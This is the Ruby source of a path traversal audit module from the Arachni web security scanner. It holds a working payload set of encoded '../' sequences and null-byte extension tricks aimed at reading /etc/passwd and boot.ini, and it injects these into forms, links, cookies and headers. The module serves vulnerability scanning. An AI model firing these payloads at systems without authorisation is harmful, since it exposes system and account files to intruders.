=begin
    Copyright 2010-2012 Tasos Laskos <tasos.laskos@gmail.com>

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
=end

module Arachni

module Modules

#
# Path Traversal audit module.
#
# @author Tasos "Zapotek" Laskos
#                                      <tasos.laskos@gmail.com>
#                                      <zapotek@segfault.gr>
# @version 0.2.5
#
# @see http://cwe.mitre.org/data/definitions/22.html
# @see http://www.owasp.org/index.php/Path_Traversal
# @see http://projects.webappsec.org/Path-Traversal
#
class PathTraversal < Arachni::Module::Base

    def prepare

        #
        # the way this works is pretty cool since it will actually
        # exploit the vulnerability in order to verify that it worked
        # which also means that the results of the exploitation will
        # appear in the report.
        #
        # *but* we may run into a web page that details the structure of
        # the 'passwd' file and get a false positive; so we need to check
        # the html code in @page.html before checking the responses of the audit
        # and give accurate feedback about the context in which the vulnerability
        # was flagged.
        #


        @__trv =  [
          '../../../../../../../../../../../../../../../../',
          '//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/' +
          '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/' +
          '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/'
        ]
        @__ext = [
            "",
            "\0.htm",
            "\0.html",
            "\0.asp",
            "\0.aspx",
            "\0.php",
            "\0.txt",
            "\0.gif",
            "\0.jpg",
            "\0.jpeg",
            "\0.png",
            "\0.css"
        ]

        @__params = [
            {
                'value'  => 'etc/passwd',
                'regexp' => /root:x:0:0:.+:[0-9a-zA-Z\/]+/im
            },
            {
                'value'  => 'boot.ini',
                'regexp' => /\[boot loader\](.*)\[operating systems\]/im
            }

        ]

        @__opts = {
            # we don't want the Auditor to interfere with our injecion strings
            :format => [ Format::STRAIGHT ],
        }

    end

    def run

        @__params.each {
            |param|

            @__opts[:regexp] = param['regexp']
            @__ext.each {
                |ext|
                @__trv.each {
                    |trv|
                    injection_str = trv + param['value'] + ext
                    audit( injection_str, @__opts )
                }
            }
        }
    end


    def self.info
        {
            :name           => 'PathTraversal',
            :description    => %q{It injects paths of common files (/etc/passwd and boot.ini)
                and evaluates the existance of a path traversal vulnerability
                based on the presence of relevant content in the HTML responses.},
            :elements       => [
                Issue::Element::FORM,
                Issue::Element::LINK,
                Issue::Element::COOKIE,
                Issue::Element::HEADER
            ],
            :author         => 'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com> ',
            :version        => '0.2.5',
            :references     => {
                'OWASP' => 'http://www.owasp.org/index.php/Path_Traversal',
                'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
            },
            :targets        => { 'Generic' => 'all' },

            :issue   => {
                :name        => %q{Path Traversal},
                :description => %q{The web application enforces improper limitation
                    of a pathname to a restricted directory.},
                :tags        => [ 'path', 'traversal', 'injection', 'regexp' ],
                :cwe         => '22',
                :severity    => Issue::Severity::MEDIUM,
                :cvssv2       => '4.3',
                :remedy_guidance    => %q{User inputs must be validated and filtered
                    before being used as a part of a filesystem path.},
                :remedy_code => '',
                :metasploitable => 'unix/webapp/arachni_path_traversal'
            }

        }
    end

end
end
end
